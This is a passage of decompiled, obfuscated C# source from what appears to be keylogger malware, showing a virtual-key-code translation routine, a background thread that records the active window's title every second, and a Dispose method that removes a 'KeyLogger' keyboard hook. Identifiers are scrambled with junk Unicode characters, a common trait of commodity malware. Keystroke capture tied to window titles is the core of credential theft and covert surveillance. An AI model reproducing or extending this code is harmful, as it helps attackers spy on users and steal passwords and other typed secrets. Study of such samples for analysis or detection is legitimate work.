          IntPtr num3 = (IntPtr) Ɖӓ\u058Fɢ\uFFFD.ӓۣŚRٷ(Ɖӓ\u058Fɢ\uFFFD.ܪľЮ\uFFFDŚ(num1, ref num2));
          Ɖӓ\u058Fɢ\uFFFD.å\uDA3B\uDD72jЅ(VKCode, ǎӺіņג, 䇹ų똛ëҚ, اC똛ҏϘ, 5, 0U, num3);
          return اC똛ҏϘ.ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return ((Keys) checked ((int) VKCode)).ToString();
      }

      private void InitializeCaptionLogging() => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          StringBuilder stringBuilder = new StringBuilder(256);
          if (Ɖӓ\u058Fɢ\uFFFD.Ŕ\uFFFD\uFFFDׁթ(Ɖӓ\u058Fɢ\uFFFD.ӚήӓՄс(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), this._currentWindow, false) != 0)
            this._currentWindow = stringBuilder.ToString();
          Thread.Sleep(1000);
        }
      })).Start();

      public void Dispose()
      {
        Ɖӓ\u058Fɢ\uFFFD.KeyLogger.UnHook(this._hook);
        GC.SuppressFinalize((object) this);
      }

      private delegate int KeyboardProc(int code, int direction, ref Keys key);
    }
  }
}
